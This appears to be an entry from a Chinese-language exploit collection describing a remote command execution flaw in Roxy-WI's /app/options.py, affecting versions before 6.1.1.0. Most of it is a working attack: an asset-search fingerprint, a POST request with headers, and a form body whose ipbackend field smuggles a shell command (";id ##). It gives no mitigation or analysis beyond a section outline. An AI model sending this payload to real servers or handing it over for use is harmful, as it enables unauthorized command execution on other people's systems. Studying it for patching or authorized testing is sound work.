# Roxy-WIoptions.py远程命令执行漏洞

- **系统**：Roxy　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="Roxy-WI"`
- **请求**：`POST /app/options.py HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Sec-Fetch-User: ?1`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 82`

**请求体 / payload**
```
alert_consumer=1&serv=127.0.0.1&ipbackend=%22%3Bid+%23%23&backend_server=127.0.0.1
```

**其他**
- Roxy-WI options.py远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Roxy-WI 6.1.1.0之前